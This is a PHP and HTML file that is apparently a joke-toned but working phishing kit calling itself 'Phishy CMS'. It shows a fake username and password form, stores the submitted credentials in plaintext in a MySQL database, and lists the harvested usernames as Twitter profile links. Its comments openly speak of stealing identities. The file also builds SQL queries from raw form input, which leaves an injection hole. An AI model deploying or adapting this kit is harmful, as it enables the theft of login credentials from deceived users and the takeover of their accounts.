<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>I haz a title!</title>
<link href="http://www.site.com/Content/Site.css" rel="stylesheet" type="text/css" />
<style>
	.container{
	width:826px;
	height:600px;
	background:url(layout_bg.jpg) repeat-x -4px 0px;
	margin:auto;
	text-align:center;
	position:relative;
	direction:rtl;
}
.disclaimer {float:right;font-size:8px;}
.footer {width:820px;}
.netfart{float:left;}
</style>
</head>



<center>



<?php
// uses your db to store t3h stolen data
mysql_connect("SQLSERVER", "USERNAME", "PASSWORD") or die(mysql_error());
mysql_select_db("TABLE") or die(mysql_error());

//submit your form and magic shit happens here
if (isset($_POST['submit'])) {

//This makes sure you are successfully stealing people's identities
if (!$_POST['usern'] | !$_POST['passw'] ) {
die('You missed a spot');
}

// checks if the username has already been duped by you
if (!get_magic_quotes_gpc()) {
$_POST['usern'] = addslashes($_POST['usern']);
}
$usercheck = $_POST['usern'];
$check = mysql_query("SELECT usern FROM TABLE WHERE usern = '$usercheck'")
or die(mysql_error());
$check2 = mysql_num_rows($check);

//if the name exists it gives an error
if ($check2 != 0) {
die('Sorry, the identity '.$_POST['usern'].' has already been stolen.');
}

// now we stick the shit in the DB
$insert = "INSERT INTO gilad (usern, passw)
VALUES ('".$_POST['usern']."', '".$_POST['passw']."')";
$add_member = mysql_query($insert);

?>


<h1>thanks</h1>
<p>your shit has been emphishened</p>

<?php
}
else
{
?>

   

<body>
<table style="text-align: center; height: 604px; width: 800px;" border="0"
 cellpadding="2" cellspacing="2" background="http://gilad.netfart.com/layout_bg.jpg">
  <tbody>
    <tr>
      <td colspan="2" rowspan="1"></td>
    </tr>
    <tr>
      <td style="width: 250px">
      
 <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
<table style="text-align: center; width: 100%;" border="0">
<tr><td>
<input type="text" name="usern" maxlength="60">
</td><td>username</td></tr>
<tr><td>
<input type="password" name="passw" maxlength="10">
</td><td>password</td></tr>
<tr><th align=right><input type="submit" name="submit" value="submit"></th></tr></table>
</form>

<?php
}
?> 
      
      </td>
      <td style="text-align: right">
      <h3>visible header</h3>
      <h4>also visible</h4>
      
<?php
// the fun bits
mysql_connect("SQLSERVER", "USERNAME", "PASSWORD") or die(mysql_error());
mysql_select_db("TABLE") or die(mysql_error());
$data = mysql_query("SELECT * FROM TABLE")
or die(mysql_error());
$num_rows = mysql_num_rows($data);
//this part was particular to our first implementation of the system 
//and will most likely prove useless to you.
//Fun fact: the following line of code is the only one actually
//specifically written for Phishy CMS rather than just plagiarized 
//from about.com's PHP tutorial or the PHP manual.
print "<h3>some shit".$num_rows ." some other shit</h3>";
//w3rd
Print "<table border cellpadding=3>";
while($info = mysql_fetch_array( $data ))
{
Print "<a href=\"http://www.twitter.com/".$info['usern'] . "\">".$info['usern'] ."</a>, ";
}



?> 
 
      </td>
    </tr>
    <tr>
      <td colspan="2" rowspan="1"></td>
    </tr>
  </tbody>
</table>
<br>
</center>

	<table><tbody><tr><td>		
		<h3>footer shit</h3>
			
            <a align=left href="http://www.site.com" id="netfart" onclick="this.target='_blank';">
        footer link
        </a>
    </table></tbody></tr></td>

</body>
</html>